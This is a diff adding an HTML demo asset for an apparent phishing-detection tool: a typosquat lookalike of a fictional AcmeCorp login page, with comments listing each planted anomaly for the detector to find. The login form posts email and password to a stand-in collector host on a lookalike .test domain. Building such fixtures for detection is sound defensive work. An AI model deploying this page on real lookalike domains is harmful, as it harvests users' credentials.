@@ -1,0 +1,98 @@
+<!doctype html>
+<!--
+  Atlas demo asset — TYPOSQUAT LOOKALIKE.
+
+  Public URL (demo hosting): https://acmecorp-secure-login.test
+  Anomalies vs the legit reference (legit-acmecorp.html):
+
+    * URL is a typosquat ("acmecorp-secure-login.test" not "acmecorp-demo.test")
+    * Logo wordmark misspells the brand ("AccmeCorp", double-c)
+    * CTA copy mistranscribed ("Login to your account" vs "Sign in to AcmeCorp")
+    * Footer links resolve to non-canonical domains
+    * Legal links replaced with "#" stubs (no real ToS/Privacy hosted)
+
+  These anomalies are declared in code in
+  backend/app/modules/visual_data.py so the mock path emits findings
+  even when the Claude vision call is unavailable.
+-->
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>AcmeCorp — Login</title>
+  <style>
+    :root {
+      --brand: #1A2B45;
+      --brand-accent: #FFB347;
+      --ink: #1a1a1a;
+      --muted: #6b7280;
+      --bg: #f7f8fa;
+      --card: #ffffff;
+      --rule: #e5e7eb;
+      --font: "Inter", -apple-system, "Segoe UI", system-ui, sans-serif;
+    }
+    * { box-sizing: border-box; }
+    html, body { margin: 0; padding: 0; background: var(--bg); color: var(--ink); font-family: var(--font); }
+    .top { background: var(--brand); color: white; padding: 14px 32px; display: flex; align-items: center; gap: 16px; }
+    .logo { font-weight: 700; letter-spacing: -0.02em; font-size: 20px; }
+    .logo span { color: var(--brand-accent); }
+    .top nav a { color: rgba(255,255,255,0.85); text-decoration: none; margin-left: 24px; font-size: 14px; }
+    main { display: flex; justify-content: center; padding: 64px 24px; }
+    .card { background: var(--card); border: 1px solid var(--rule); border-radius: 10px; padding: 40px 36px; width: 100%; max-width: 420px; box-shadow: 0 1px 2px rgba(15, 23, 42, 0.06); }
+    .card h1 { margin: 0 0 8px; font-size: 22px; font-weight: 600; }
+    .card p.sub { margin: 0 0 24px; color: var(--muted); font-size: 14px; }
+    label { display: block; font-size: 13px; color: #374151; margin: 12px 0 6px; }
+    input[type="email"], input[type="password"] {
+      width: 100%; padding: 10px 12px; border: 1px solid var(--rule);
+      border-radius: 6px; font-size: 14px;
+    }
+    button.primary {
+      width: 100%; margin-top: 20px; padding: 12px 14px; border: none;
+      background: var(--brand); color: white; font-size: 15px; font-weight: 600;
+      border-radius: 6px; cursor: pointer;
+    }
+    .legal { margin-top: 24px; font-size: 12px; color: var(--muted); text-align: center; }
+    .legal a { color: var(--brand); text-decoration: none; }
+    footer { padding: 32px 24px; text-align: center; color: var(--muted); font-size: 12px; }
+    footer a { color: var(--muted); text-decoration: none; margin: 0 8px; }
+  </style>
+</head>
+<body>
+  <header class="top">
+    <!-- Anomaly: logo wordmark misspells the brand. -->
+    <div class="logo">Accme<span>Corp</span></div>
+    <nav>
+      <a href="#">Product</a>
+      <a href="#">Pricing</a>
+      <a href="#">Customers</a>
+      <a href="#">Docs</a>
+    </nav>
+  </header>
+  <main>
+    <section class="card">
+      <!-- Anomaly: CTA / heading copy diverges from canonical brand language. -->
+      <h1>Login to your account</h1>
+      <p class="sub">Enter your credentials to access AcmeCorp.</p>
+      <!-- Anomaly: form posts to an off-brand collector. -->
+      <form action="https://collect.acmecorp-secure-login.test/auth" method="post">
+        <label for="email">Email address</label>
+        <input id="email" name="email" type="email" autocomplete="email" required />
+        <label for="password">Password</label>
+        <input id="password" name="password" type="password" autocomplete="current-password" required />
+        <!-- Anomaly: CTA button copy reads "Login" not "Sign in to AcmeCorp". -->
+        <button class="primary" type="submit">Login</button>
+      </form>
+      <p class="legal">
+        <!-- Anomaly: legal links go nowhere. -->
+        By logging in, you agree to our <a href="#">Terms</a> and <a href="#">Privacy</a>.
+      </p>
+    </section>
+  </main>
+  <footer>
+    <!-- Anomaly: footer points at non-canonical domains. -->
+    <a href="https://acmecorp-secure-login.test">acmecorp-secure-login.test</a> ·
+    <a href="https://help.acmecorp-secure-login.test">Help</a> ·
+    © 2026 AcmeCorp.
+  </footer>
+</body>
+</html>
